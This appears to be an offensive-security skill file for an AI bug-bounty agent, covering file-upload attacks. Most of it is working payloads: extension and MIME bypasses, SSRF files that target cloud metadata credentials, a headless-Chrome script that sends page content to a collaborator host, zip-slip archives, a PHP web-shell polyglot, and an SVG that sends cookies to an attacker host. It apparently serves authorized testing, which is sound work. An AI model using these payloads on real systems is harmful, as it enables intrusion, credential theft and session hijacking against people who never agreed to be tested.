---
name: hunt-file-upload
description: "TRIGGER — any `/upload`, `/avatar`, `/profile-picture`, `/attachment`, or `/import` endpoint accepts a file. SKIP — hunt-xxe once the uploaded format is XML-based (DOCX/PPTX/SVG-with-XXE) and the exploit path is XML parsing rather than extension/content-type bypass; hunt-ssti if the uploaded file is a server-side template that gets rendered, not stored/executed as a plain file."
---

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## ImageMagick / FFmpeg Exploitation

### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
```bash
# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
# MVG SSRF payload — fetches internal URL during processing
cat > /tmp/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# SVG SSRF (ImageMagick processes SVG remotely)
cat > /tmp/ssrf.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
</svg>
EOF

# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
# Upload a crafted WebP file targeting libwebp heap overflow
# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
```

### FFmpeg SSRF via HLS Playlist
```bash
# FFmpeg processes m3u8 playlists and fetches referenced segments
cat > /tmp/ssrf.m3u8 << 'EOF'
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
EOF

# Also works with concat demuxer
cat > /tmp/concat.txt << 'EOF'
ffconcat version 1.0
file 'http://COLLAB_HOST/ffmpeg-ssrf'
EOF

# Test: upload .m3u8 or video file to any video processing endpoint
```

---

## Headless Chrome / PDF Generator SSRF

### HTML → PDF Converter Attacks
```bash
# Target: invoice generators, report exporters, screenshot services
# Inject HTML that causes headless Chrome to fetch internal resources

# SSRF via CSS import
PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'

# SSRF via HTML iframe
PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'

# Local file read
PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'

# JavaScript execution (if sandbox not enforced)
PAYLOAD='<html><body><script>
fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
</script></body></html>'

# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
curl -s -X POST "https://$TARGET/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d "{\"html\": \"$PAYLOAD\"}"
```

---

## Archive Extraction Attacks (Zip Slip / Symlink)

```bash
# Zip Slip — path traversal via archive filenames
pip3 install evilarc
python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip

# Symlink attack — archive contains symlink to sensitive file
mkdir -p /tmp/sym_attack
ln -s /etc/passwd /tmp/sym_attack/innocent.txt
zip -ry /tmp/symlink.zip /tmp/sym_attack/

# TAR symlink attack
tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/

# Test: upload to any /import, /extract, /unzip endpoint
curl -s -X POST "https://$TARGET/api/import" \
  -F "file=@/tmp/zipslip.zip"
```

---

## One upload, two filenames — `filename` vs `filename*`

Added 2026-11-13 from the operator's technique digest (reported as CVE-2026-104269
against the WAF side: ModSecurity, Coraza, SamWaf, BunkerWeb). **One request**, and it
is the cheapest upload test there is: no payload, no second account, nothing stored
until the differential is proven.

A multipart part may carry both parameters. RFC 6266 / RFC 8187 say the extended one
wins, so a stack where the WAF reads `filename` and the application reads `filename*`
disagrees about what was just uploaded — the WAF allows `safe.jpg`, the backend writes
`shell.php`. Put the harmless `filename` **first** and the real one second: that order
is what the vulnerable parsers were measured on, and the reverse order is what the
patched ones normalise.

Build the body with explicit CRLF and send it from a file — a heredoc gives LF line
endings, which some multipart parsers reject outright, and a rejected body reads as
"not vulnerable" when nothing was ever parsed. Keep the bytes: the stored file is the
PoC.

```bash
MARK="zqx$(date +%s)"; B="----b$MARK"
printf '%s\r\n' \
  "--$B" \
  "Content-Disposition: form-data; name=\"file\"; filename=\"safe.jpg\"; filename*=UTF-8''probe-$MARK.php" \
  "Content-Type: image/jpeg" \
  "" \
  "upload-name-differential $MARK" \
  "--$B--" > body-$MARK.bin

CBH_PROJECT=$P bbcurl -si -X POST "https://$TARGET/upload" \
  -H "Content-Type: multipart/form-data; boundary=$B" \
  --data-binary @body-$MARK.bin | head -40
```

Read the answer in this order, and stop at the first one that settles it:

1. **The response names a file.** `probe-$MARK.php` in the JSON/Location/HTML => the
   backend took the extended parameter. `safe.jpg` => it took the simple one.
2. **Neither name comes back.** Fetch the listing or the stored URL the app gives for a
   normal upload and look for the marker — the served path's extension is the answer.
3. **The request is refused** with a WAF page while the same part with only
   `filename="probe-$MARK.php"` is also refused: no differential, close the lane.
   Refused with the dual name but allowed with a single harmless name => the WAF is
   reading one parameter; which one it read is the other half of the finding.

A differential alone is a `primitives/` entry: it proves the two parsers disagree. It
becomes a finding when the stored object is **served back** under the extension the
backend kept and that extension is handled (PHP/JSP/ASPX executed, or `.svg`/`.html`
rendered same-origin). The extension-handling test is the existing bypass tree above —
this adds a way past the WAF layer, not a new impact.

**Chain:** needs `upload-endpoint-reachable` · gives `waf-filename-differential`,
`controlled-stored-extension`

---

## SVG that comes back to life after the sanitizer

Added 2026-11-13 ("Scalable Vector Grief") from the operator's digest. The sanitizer
question is not "was the `<script>` removed" — it is **what else in the document can
name a stylesheet**, because an XSLT stylesheet is a program.

Three revival routes, in the order the upload surface actually gives them to you:

1. **Document-internal processing instruction.** Everything is inside the bytes you
   upload, so the sanitizer is the only obstacle:
   ```xml
   <?xml-stylesheet type="text/xsl" href="data:text/xml;base64,PHN0eWxlc2hlZXQ..."?>
   <svg xmlns="http://www.w3.org/2000/svg"></svg>
   ```
   A DOM-based sanitizer that walks elements and attributes never sees a processing
   instruction, and an allowlist written for `<script>`/`on*` does not mention it.
2. **The `Link` response header.** `Link: <...>; rel=stylesheet` applies a stylesheet
   the document does not contain — so it is invisible to any check that reads the file.
   Reachable only where response headers for the stored object move with input (a
   header-injection primitive, a CDN rule, a metadata field copied into headers): worth
   a look exactly when `hunt-header-injection` already has something on this host.
3. **Safari's `<use href>` / `@import`.** Script reached indirectly, so a single-browser
   PoC. Record the browser and version in the report; it is still a finding, at the
   severity one-browser impact earns.

```bash
# Precondition that decides whether any of this matters — how is the SVG served back?
CBH_PROJECT=$P bbcurl -si "https://$TARGET/$STORED_SVG_PATH" \
  | grep -iE "^(content-type|content-disposition|content-security-policy|x-content-type|link):"
```
`content-type: image/svg+xml` with no `content-disposition: attachment`, served from the
app's own origin and with no CSP on that path, is what makes the stored document a
same-origin script host. An `attachment` disposition, a sandbox origin
(`usercontent.target.tld`) or a CSP with `script-src 'none'` on that path kills all
three routes — measure before writing a payload.

**Chain:** needs `svg-upload-accepted`, `svg-served-same-origin-inline` · gives
`stored-xss-candidate`

---

## Related Skills & Chains

- **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
- **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
- **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
- **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.